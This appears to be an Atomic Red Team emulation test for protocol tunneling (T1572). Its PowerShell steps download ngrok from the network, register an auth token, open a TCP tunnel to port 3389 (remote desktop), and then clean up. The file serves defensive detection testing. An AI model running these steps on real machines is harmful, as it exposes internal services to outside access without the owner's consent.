{
  "id": "4cdc9fc7-53fb-4894-9f0c-64836943ea60",
  "name": "run ngrok",
  "description": "Download and run ngrok. Create tunnel to chosen port.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "58f05a58-c2f4-4ac4-a7d9-0cbe5fdb9419",
      "type": "execute-command",
      "data": {
        "command": "C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken #{api_token} | Out-Null\nStart-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp #{port_num} } | Out-Null\nStart-Sleep -s 5 \nStop-Job -Name Job1 | Out-Null\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "31719a97-4a98-4a55-b835-aeef02c3c872",
      "type": "execute-command",
      "data": {
        "command": "Remove-Item C:\\Users\\Public\\ngrok -Recurse -ErrorAction Ignore\nRemove-Item C:\\%userprofile%\\AppData\\Local\\ngrok -ErrorAction Ignore\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "efbfa6c3-a343-4d08-afdc-e4325a34501f",
      "name": "Check dependency 1/1",
      "description": "Download ngrok\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path C:\\Users\\Public\\ngrok) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "d73893c7-b3f8-484c-9ba3-f7dbfbe5622d",
      "name": "Resolve dependency 1/1",
      "description": "Download ngrok\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Path C:\\Users\\Public\\ngrok -ItemType Directory | Out-Null\nInvoke-WebRequest #{download} -OutFile C:\\Users\\Public\\ngrok\\ngrok-v3-stable-windows-amd64.zip\nExpand-Archive C:\\Users\\Public\\ngrok\\ngrok-v3-stable-windows-amd64.zip -DestinationPath C:\\Users\\Public\\ngrok\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "13e4be3a-edee-4189-9828-077fa4846f77",
      "name": "Re-check dependency 1/1",
      "description": "Download ngrok\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path C:\\Users\\Public\\ngrok) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "58f05a58-c2f4-4ac4-a7d9-0cbe5fdb9419",
      "p": "on-success",
      "o": "31719a97-4a98-4a55-b835-aeef02c3c872"
    },
    {
      "s": "58f05a58-c2f4-4ac4-a7d9-0cbe5fdb9419",
      "p": "on-failure",
      "o": "31719a97-4a98-4a55-b835-aeef02c3c872"
    },
    {
      "s": "efbfa6c3-a343-4d08-afdc-e4325a34501f",
      "p": "on-success",
      "o": "58f05a58-c2f4-4ac4-a7d9-0cbe5fdb9419"
    },
    {
      "s": "efbfa6c3-a343-4d08-afdc-e4325a34501f",
      "p": "on-failure",
      "o": "d73893c7-b3f8-484c-9ba3-f7dbfbe5622d"
    },
    {
      "s": "d73893c7-b3f8-484c-9ba3-f7dbfbe5622d",
      "p": "on-success",
      "o": "13e4be3a-edee-4189-9828-077fa4846f77"
    },
    {
      "s": "13e4be3a-edee-4189-9828-077fa4846f77",
      "p": "on-failure",
      "o": "58f05a58-c2f4-4ac4-a7d9-0cbe5fdb9419"
    }
  ],
  "tags": [
    "T1572",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "api_token",
      "type": "string",
      "description": "ngrok API",
      "value": "N/A"
    },
    {
      "name": "port_num",
      "type": "integer",
      "description": "port number for tunnel",
      "value": "3389"
    },
    {
      "name": "download",
      "type": "string",
      "description": "link to download ngrok",
      "value": "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
    }
  ]
}